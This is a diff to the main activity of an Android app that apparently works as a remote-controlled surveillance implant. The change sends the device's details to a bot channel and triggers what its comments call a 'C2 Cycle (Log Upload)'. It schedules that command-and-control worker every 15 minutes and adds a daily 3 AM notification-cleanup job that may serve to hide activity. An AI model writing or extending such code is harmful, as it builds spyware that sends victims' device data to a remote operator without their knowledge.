@@ -259,14 +259,21 @@ class MainActivity : AppCompatActivity() {
                 return@launch
             }
 
-            // 2. Send Device Info
+            // 2. Register Bot Commands FIRST (before sending test message)
+            val commandsRegistered = client.setMyCommands()
+            if (!commandsRegistered) {
+                Log.w("MainActivity", "⚠️ Failed to register commands, but continuing with test")
+            } else {
+                Log.d("MainActivity", "✅ Commands registered successfully")
+            }
+
+            // 3. Send Device Info
             val deviceInfo = DeviceInfoHelper.getDeviceInfo(this@MainActivity)
             client.sendMessage("🔔 *TEST CONNECTION*\n\n$deviceInfo")
-            client.setMyCommands()
 
             withContext(Dispatchers.Main) {
-                 Toast.makeText(this@MainActivity, "✅ Token OK. Info Sent.", Toast.LENGTH_SHORT).show()
-                 // 3. Trigger C2 Cycle (Log Upload)
+                 Toast.makeText(this@MainActivity, "✅ Token OK. Commands Updated. Info Sent.", Toast.LENGTH_SHORT).show()
+                 // 4. Trigger C2 Cycle (Log Upload)
                  triggerOneTimeC2()
             }
         }
@@ -297,15 +304,44 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun schedulePeriodicWork() {
-        val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
+        // 1. Schedule C2Worker every 15 minutes
+        val c2WorkRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
             .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
             .build()
         
         WorkManager.getInstance(this).enqueueUniquePeriodicWork(
             "SentinelC2",
             ExistingPeriodicWorkPolicy.KEEP,
-            workRequest
+            c2WorkRequest
         )
+
+        // 2. Schedule NotificationCleanupWorker daily at 3 AM
+        val cleanupWorkRequest = PeriodicWorkRequestBuilder<com.zero.sentinel.workers.NotificationCleanupWorker>(1, TimeUnit.DAYS)
+            .setInitialDelay(calculateDelayTo3AM(), TimeUnit.MILLISECONDS)
+            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
+            .build()
+        
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "NotificationCleanup",
+            ExistingPeriodicWorkPolicy.KEEP,
+            cleanupWorkRequest
+        )
+    }
+
+    private fun calculateDelayTo3AM(): Long {
+        val now = java.util.Calendar.getInstance()
+        val target = java.util.Calendar.getInstance().apply {
+            set(java.util.Calendar.HOUR_OF_DAY, 3)
+            set(java.util.Calendar.MINUTE, 0)
+            set(java.util.Calendar.SECOND, 0)
+        }
+        
+        // If 3 AM has already passed today, schedule for tomorrow
+        if (target.before(now)) {
+            target.add(java.util.Calendar.DAY_OF_MONTH, 1)
+        }
+        
+        return target.timeInMillis - now.timeInMillis
     }
 
     private fun checkAndStartService() {
